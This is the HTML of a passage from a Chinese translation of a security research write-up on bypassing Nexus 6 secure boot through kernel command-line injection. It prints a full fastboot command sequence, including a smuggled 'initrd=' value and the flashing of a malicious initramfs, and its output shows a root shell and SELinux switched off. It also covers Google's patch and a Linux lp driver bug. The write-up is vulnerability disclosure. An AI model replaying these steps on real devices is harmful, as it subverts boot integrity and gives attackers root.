2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">十二、获取root权限</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">现在一切条件已经准备就绪：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1、我们有了一个恶意的initramfs存档。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2、我们可以使用fastboot接口，从固定的物理地址上将initramfs载入内存中。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3、我们可以引导Linux内核填充这个initramfs。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">对于安全启动流程来说，信任关系已被破坏，如下所示：</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t01a82a765759739630.png" title="t0104c4081e99ae71d6.png" alt="http://p5.qhimg.com/t0104c4081e99ae71d6.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">成功的攻击过程如下所示：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;adb&nbsp;shell
+shamu:/&nbsp;$&nbsp;id
+uid=2000(shell)&nbsp;gid=2000(shell)&nbsp;groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc)&nbsp;context=u:r:shell:s0
+shamu:/&nbsp;$&nbsp;getenforce
+Enforcing
+shamu:/&nbsp;$&nbsp;setenforce&nbsp;permissive
+setenforce:&nbsp;Couldn&#39;t&nbsp;set&nbsp;enforcing&nbsp;status&nbsp;to&nbsp;&#39;permissive&#39;:&nbsp;Permission&nbsp;denied
+shamu:/&nbsp;$&nbsp;reboot&nbsp;bootloader
+$&nbsp;fastboot&nbsp;getvar&nbsp;unlocked
+[...]
+unlocked:&nbsp;no
+finished.&nbsp;total&nbsp;time:&nbsp;0.008s
+$&nbsp;fastboot&nbsp;oem&nbsp;config&nbsp;fsg-id&nbsp;&quot;a&nbsp;initrd=0x11000000,1518172&quot;
+[...]
+(bootloader)&nbsp;&lt;UTAG&nbsp;name=&quot;fsg-id&quot;&nbsp;type=&quot;str&quot;&nbsp;protected=&quot;false&quot;&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;value&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;a&nbsp;initrd=0x11000000,1518172
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;/value&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;description&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FSG&nbsp;IDs,&nbsp;see&nbsp;http://goo.gl/gPmhU
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;/description&gt;
+(bootloader)&nbsp;&lt;/UTAG&gt;
+OKAY&nbsp;[&nbsp;&nbsp;0.016s]
+finished.&nbsp;total&nbsp;time:&nbsp;0.016s
+$&nbsp;fastboot&nbsp;flash&nbsp;aleph&nbsp;malicious.cpio.gz
+[...]
+target&nbsp;reported&nbsp;max&nbsp;download&nbsp;size&nbsp;of&nbsp;536870912&nbsp;bytes
+sending&nbsp;&#39;aleph&#39;&nbsp;(1482&nbsp;KB)...
+OKAY&nbsp;[&nbsp;&nbsp;0.050s]
+writing&nbsp;&#39;aleph&#39;...
+(bootloader)&nbsp;Not&nbsp;allowed&nbsp;in&nbsp;LOCKED&nbsp;state!
+FAILED&nbsp;(remote&nbsp;failure)
+finished.&nbsp;total&nbsp;time:&nbsp;0.054s
+$&nbsp;fastboot&nbsp;continue
+[...]
+resuming&nbsp;boot...
+OKAY&nbsp;[&nbsp;&nbsp;0.007s]
+finished.&nbsp;total&nbsp;time:&nbsp;0.007s
+$&nbsp;adb&nbsp;shell
+shamu:/&nbsp;#&nbsp;id
+uid=0(root)&nbsp;gid=0(root)&nbsp;groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc)&nbsp;context=u:r:su:s0
+shamu:/&nbsp;#&nbsp;getenforce
+Enforcing
+shamu:/&nbsp;#&nbsp;setenforce&nbsp;permissive
+shamu:/&nbsp;#&nbsp;getenforce
+Permissive
+shamu:/&nbsp;#</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">十三、超越initramfs：固件注入</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">现在我们已经完全控制了rootfs，我们可以创建一个恶意的/vendor目录，这个目录通常会包含当前设备可用的各种SoC固件镜像：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">shamu:/&nbsp;#&nbsp;ls&nbsp;/vendor/firmware
+VRGain.bin&nbsp;adsp.b03&nbsp;adsp.b11&nbsp;bcm20795_firmware.ncd&nbsp;left.boost.music.eq&nbsp;left.boost_n1b12.patch&nbsp;right.boost.ringtone.eq&nbsp;right.boost_ringtone_table.preset&nbsp;venus.mdt
+a420_pfp.fw&nbsp;adsp.b04&nbsp;adsp.b12&nbsp;bcm4354A2.hcd&nbsp;left.boost.ringtone.config&nbsp;left.boost_n1c2.patch&nbsp;right.boost.speaker&nbsp;right.boost_voice_table.preset&nbsp;widevine.b00
+a420_pm4.fw&nbsp;adsp.b05&nbsp;adsp.mdt&nbsp;cy8c20247_24lkxi.hex&nbsp;left.boost.ringtone.eq&nbsp;left.boost_ringtone_table.preset&nbsp;right.boost.voice.config&nbsp;venus.b00&nbsp;widevine.b01
+acdb.mbn&nbsp;adsp.b06&nbsp;aonvr1.bin&nbsp;fw_bcmdhd.bin&nbsp;left.boost.speaker&nbsp;left.boost_voice_table.preset&nbsp;right.boost.voice.eq&nbsp;venus.b01&nbsp;widevine.b02
+adsp.b00&nbsp;adsp.b07&nbsp;aonvr2.bin&nbsp;fw_bcmdhd_apsta.bin&nbsp;left.boost.voice.config&nbsp;right.boost.music.config&nbsp;right.boost_music_table.preset&nbsp;venus.b02&nbsp;widevine.b03
+adsp.b01&nbsp;adsp.b08&nbsp;atmel-a432-14061601-0102aa-shamu-p1.tdat&nbsp;keymaster&nbsp;left.boost.voice.eq&nbsp;right.boost.music.eq&nbsp;right.boost_n1b12.patch&nbsp;venus.b03&nbsp;widevine.mdt
+adsp.b02&nbsp;adsp.b10&nbsp;atmel-a432-14103001-0103aa-shamu.tdat&nbsp;left.boost.music.config&nbsp;left.boost_music_table.preset&nbsp;right.boost.ringtone.config&nbsp;right.boost_n1c2.patch&nbsp;venus.b04</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">内核驱动通常会在初始化是使用这些镜像，并在需要的时候更新他们的SoC副本。因此，攻击者可以写入未签名的固件镜像。我们没有确认这种攻击场景是否有效，但根据我们对其他设备的经验，这种场景应该是没问题的。对于签名的固件来说，攻击者可以利用这种方式实现降级攻击。此外，调制解调器固件位于/firmware/image目录下，理论上讲，我们可以通过修改这个目录（如下所示）完成类似攻击。同样，我们也没有去验证设备是否存在某种完整性检查机制，以及设备是否会受到降级攻击，我们可以在未来工作中研究这个问题。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">shamu:/&nbsp;#&nbsp;umount&nbsp;-f&nbsp;/firmware
+shamu:/&nbsp;#&nbsp;mount&nbsp;&nbsp;/dev/block/mmcblk0p1&nbsp;/firmware&nbsp;-o&nbsp;rw
+shamu:/&nbsp;#&nbsp;ls&nbsp;/firmware/image
+acdb.mbn&nbsp;bdwlan20.bin&nbsp;cmnlib.b03&nbsp;efs1.bin&nbsp;isdbtmm.b01&nbsp;mba_9225.mbn.gz&nbsp;playready.b00&nbsp;playready.mdt&nbsp;prov.b03&nbsp;qwlan11.bin&nbsp;sampleapp.b00&nbsp;sampleapp.mdt&nbsp;securemm.b01&nbsp;tqs.b00&nbsp;tqs.mdt&nbsp;utf20.bin
+apps_9225.mbn.gz&nbsp;cmnlib.b00&nbsp;cmnlib.mdt&nbsp;efs2.bin&nbsp;isdbtmm.b02&nbsp;mba_9625.mbn.gz&nbsp;playready.b01&nbsp;prov.b00&nbsp;prov.mdt&nbsp;qwlan20.bin&nbsp;sampleapp.b01&nbsp;sbl1_9225.mbn.gz&nbsp;securemm.b02&nbsp;tqs.b01&nbsp;tz_9225.mbn.gz
+apps_9625.mbn.gz&nbsp;cmnlib.b01&nbsp;dsp2_9225.mbn.gz&nbsp;efs3.bin&nbsp;isdbtmm.b03&nbsp;otp11.bin&nbsp;playready.b02&nbsp;prov.b01&nbsp;qdsp6sw_9225.mbn.gz&nbsp;rpm_9225.mbn.gz&nbsp;sampleapp.b02&nbsp;sbl1_9625.mbn.gz&nbsp;securemm.b03&nbsp;tqs.b02&nbsp;tz_9625.mbn.gz
+bdwlan11.bin&nbsp;cmnlib.b02&nbsp;dsp2_9625.mbn.gz&nbsp;isdbtmm.b00&nbsp;isdbtmm.mdt&nbsp;otp20.bin&nbsp;playready.b03&nbsp;prov.b02&nbsp;qdsp6sw_9625.mbn.gz&nbsp;rpm_9625.mbn.gz&nbsp;sampleapp.b03&nbsp;securemm.b00&nbsp;securemm.mdt&nbsp;tqs.b03&nbsp;utf11.bin
+shamu:/&nbsp;#&nbsp;echo&nbsp;foo&nbsp;&gt;&nbsp;/firmware/image/foo
+shamu:/&nbsp;#&nbsp;cat&nbsp;/firmware/image/foo
+foo</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">十四、Google的补丁</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Google在2017年5月的</span><a href="http://7年5月的安全公告中发布了这个" target="_self" style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">安全公告</a><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">中发布了这个漏洞的补丁。N6F27C版系统中Bootloader版本已升级至moto-apq8084-72.03，这版Bootloader会对fsg-id、carrier以及console的配置参数进行过滤处理：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;fastboot&nbsp;oem&nbsp;config&nbsp;fsg-id&nbsp;&quot;foo&nbsp;foo=1&quot;
+[...]
+$&nbsp;fastboot&nbsp;oem&nbsp;config&nbsp;carrier&nbsp;&quot;bar&nbsp;bar=1&quot;
+[...]
+$&nbsp;fastboot&nbsp;oem&nbsp;config&nbsp;carrier&nbsp;&quot;baz&nbsp;baz=1&quot;
+[...]
+$&nbsp;fastboot&nbsp;oem&nbsp;config
+[android@aosp:/aosp/source/android-7.1.1_r40]$&nbsp;fastboot&nbsp;oem&nbsp;config
+[...]
+(bootloader)&nbsp;&lt;UTAG&nbsp;name=&quot;carrier&quot;&nbsp;type=&quot;str&quot;&nbsp;protected=&quot;false&quot;&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;value&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bar
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;/value&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;description&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Carrier&nbsp;IDs,&nbsp;see&nbsp;http://goo.gl/lojLh3
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;/description&gt;
+(bootloader)&nbsp;&lt;/UTAG&gt;
+(bootloader)&nbsp;&lt;UTAG&nbsp;name=&quot;console&quot;&nbsp;type=&quot;str&quot;&nbsp;protected=&quot;false&quot;&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;value&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;baz
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;/value&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;description&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Config&nbsp;kernel&nbsp;console&nbsp;log
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;enable|true&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;enable&nbsp;with&nbsp;default&nbsp;settings
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;disable|false&nbsp;&nbsp;&nbsp;-&nbsp;disable
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;config&nbsp;string&gt;&nbsp;-&nbsp;enable&nbsp;with&nbsp;customized&nbsp;settings
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(e.g.:&nbsp;&quot;ttyHSL0&quot;,&nbsp;&quot;ttyHSL0,230400,n8&quot;)
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;/description&gt;
+(bootloader)&nbsp;&lt;/UTAG&gt;
+(bootloader)&nbsp;&lt;UTAG&nbsp;name=&quot;fsg-id&quot;&nbsp;type=&quot;str&quot;&nbsp;protected=&quot;false&quot;&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;value&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foo
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;/value&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;description&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FSG&nbsp;IDs,&nbsp;see&nbsp;http://goo.gl/gPmhU
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;/description&gt;
+(bootloader)&nbsp;&lt;/UTAG&gt;]</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">十五、题外话：Linux内核越界写入漏洞（CVE-2017-1000363）</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在本次研究过程中，我们意外发现了另一个漏洞（</span><a href="https://alephsecurity.com/vulns/aleph-2017023" target="_self" style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">CVE-2017-1000363</a><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">），这是Linux内核中的一个越界写入漏洞，历史非常久远（从2.2.0版本起就已经存在！）。漏洞位于lp驱动中（因此内核参数需为CONFIG_PRINTER=y），当许多lp=none参数被附加到内核命令行中时该漏洞就会被触发：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:php;toolbar:false">static&nbsp;int&nbsp;parport_nr[LP_NO]&nbsp;=&nbsp;{&nbsp;[0&nbsp;...&nbsp;LP_NO-1]&nbsp;=&nbsp;LP_PARPORT_UNSPEC&nbsp;};
+[...]
+#ifndef&nbsp;MODULE
+static&nbsp;int&nbsp;__init&nbsp;lp_setup&nbsp;(char&nbsp;*str)
+{
+static&nbsp;int&nbsp;parport_ptr;
+[...]
+}&nbsp;else&nbsp;if&nbsp;(!strcmp(str,&nbsp;&quot;none&quot;))&nbsp;{
+parport_nr[parport_ptr++]&nbsp;=&nbsp;LP_PARPORT_NONE;
+}&nbsp;
+[...]
+}
+#endif
+[...]
+__setup(&quot;lp=&quot;,&nbsp;lp_setup);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">相应的</span><a href="https://alephsecurity.com/vulns/aleph-2017023" target="_self" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">补丁</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">已经提交到主线内核上。</span></p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="https://alephsecurity.com/2017/05/23/nexus6-initroot/" target="_blank">原文链接：https://alephsecurity.com/2017/05/23/nexus6-initroot/</a></p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="【漏洞分析】如何通过内核命令注入绕过Nexus 6的安全启动模式（含演示视频） - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="3917" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment-none alarm-info bg-primary">无任何评论</div>
+            </div>
+</div>
+<script>
+    $(function () {
+        $('.anonymous-comment').click(function () {
+            $(".join").hide();
+            $(".reg-log textarea").first().removeAttr("disabled").show();
+            $('#use_nickname').val('1');
+//            $('#trigger-nickname').attr('checked', true);
+            $('#trigger-nickname').trigger('click');
+        });
+        //为所有复选框绑定事件
+//        checkbox_on_click();
+        //ajax随机获取昵称
+//        randnicknameajax(0);
+        //ajax检测登录状态
+        comment_check_login();
+    });
+
+
+
+    function input_checkbox(flag) {
+        $('input:checkbox').each(function () {
+            var value = flag ? 1 : 0;
+            $(this).prop('checked', flag);
+            $(this).val(value);
+        });
+    }
+
+//ajax随机获取昵称
+    function randnicknameajax(flag) {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-nickname-url-ajax').val(),
+            data: {limit: 1, flag: flag},
+            dataType: "json",
+            success: function (data) {
+                $('#nick-name').val(data.data[0]);
+                _nick_name=data.data[0];
+            }
+        });
+    }
+    $();
+//ajax检测登录状态
+    function comment_check_login() {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-check-login-url-ajax').val(),
+            data: {},
+            dataType: "json",
+            success: function (data) {
+                if (data.success) {
+                    $('.join').hide();
+                    $(".reg-log textarea").first().removeAttr("disabled").show();
+                    $("#span_use_nickname").show();
+                    $('#use_nickname').val('0');
+                    $('#use_nickname').attr('checked', false);
+                }
+            }
+        });
+    }
+</script>        </div>
+    </div>
+    <div class="side-bar">
+        <div class="mod hot-news">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
+    </div>
+    <ul class="links-list">
+                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
+                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
+                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
+                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
+                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
+                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
+            </ul>
+</div>        <!-- 友情链接 -->
+        <div class="mod blog-links mobile-hide">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
+        <a href="/links/index.html" class="more">更多<i></i></a>
+    </div>
+        <ul class="links-list">
+                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
+                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
+                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
+                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
+                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
+                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
+                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
+                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
+                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
+                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
+            </ul>
+    </div>
+        <!-- 联系我们 -->
+        <div class="mod contact mobile-hide" style="text-align:center">
+    <div class="head-bar clearfix">
+        <h2><i></i><span>关注我们</span></h2>
+    </div>
+    <!-- 微信关注 -->
+    <ul class="contact-way">
+        <li><a>微信关注</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+    <!-- APP下载 -->
+    <ul class="contact-way">
+        <li><a>安全播报APP</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+</div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/common.js?v=4.5"></script>
+<script>$(function() {sync_count('comment');});</script>
+
+
+<!-- 语法高亮 -->
+<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
+    </div>
+
+        <div class="footer">
+        <div class="friend-link">
+            <a href="http://www.360.cn/" target="_blank">360首页</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">关于我们</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">联系我们</a>
+            <span>|</span>
+            <a href="/links/index.html" target="_blank">友情链接</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">招贤纳士</a>
+        </div>
+        <div class="copy">
+            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
+        </div>
+    </div>
+    
+</div>
+
+<!--奇舞团统计-->
+
+<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
+<script>
+    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
+</script>
+
+<div class="hide">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
+</div>
+<div class="backToTop_wrap off">
+    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
+</div>
+<script>
+    var $backToTop_wrap = $(".backToTop_wrap"),
+        $backToTop_btn = $("#back_to_top");
+
+    if ($(window).scrollTop() > 100) {
+        $backToTop_wrap.removeClass("off");
+    }
+    else {
+        $backToTop_wrap.addClass("off");
+    }
+
+    $(window).on("scroll", function () {
+        if ($(this).scrollTop() > 100) {
+            $backToTop_wrap.removeClass("off");
+        }
+        else {
+            $backToTop_wrap.addClass("off");
+        }
+    });
+
+    $backToTop_btn.on("click", function () {
+        $("html, body").animate({scrollTop: 0}, 120);
+    });
+
+    $(function () {
+        var navlist = $('.nav-list > li');
+
+        navlist.each(function () {
+            $(this).on('mouseenter', function () {
+                $(this).addClass('selected');
+            });
+
+            $(this).on('mouseleave', function () {
+                $(this).removeClass('selected');
+            });
+        });
+    })
+</script>
+
+
+
+</body>
+</html>
